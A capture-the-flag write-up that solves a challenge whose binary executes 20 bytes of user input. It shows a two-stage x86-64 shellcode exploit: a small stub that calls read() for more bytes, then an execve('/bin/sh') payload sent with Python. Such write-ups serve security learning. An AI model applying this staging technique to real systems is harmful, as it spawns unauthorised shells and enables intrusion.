This challenge is very similar to back_to_shell. Also here we have an input that is directly called by the main:
```c
void main(void)

{
  code *shellcode;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  shellcode = (code *)mmap((void *)0x0,0x1000,7,0x22,-1,0);
  read(0,shellcode,0x14);
  printf("Executing you shellcode.");
  (*shellcode)();
  return;
}
```
(I have deleted from the source code a printf that just print a ascii art).
The problem here is that we can only read 0x14 (20 in decimal) bytes, so if we want to use the same shellcode as back_to_shell we cannot because the length of the payload was 0x18 (shellcode + bin/sh\x00).
What we can do, as the name of the challenge suggest is to create a multystage shellcode:
- first stage to call the syscall read with an higher length 
- pass to the read the shellcode for spawn a shell
the stage 1 can be this:
```python
stage_1="""
mov rsi, rax
add rsi, 20
xor rdi, rdi
mov edx, 0x100
xor rax, rax
syscall
"""
asm_stage_1 = asm(stage_1)

r.send(asm_stage_1)
```

this will call a read in the area just after the shellcode for the stage 1, here we will put the shellcode for the stage 2:
```python
stage_2="""
mov rdi, rcx
add rdi,22
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
"""
asm_stage_2=asm(stage_2)
payload=asm_stage_2+ b"/bin/sh\x00"
r.send(payload)
```
this will spawn a shell.
Notice that in both stage 1 and 2 the second instruction is dependent from the size of the shellcode itself.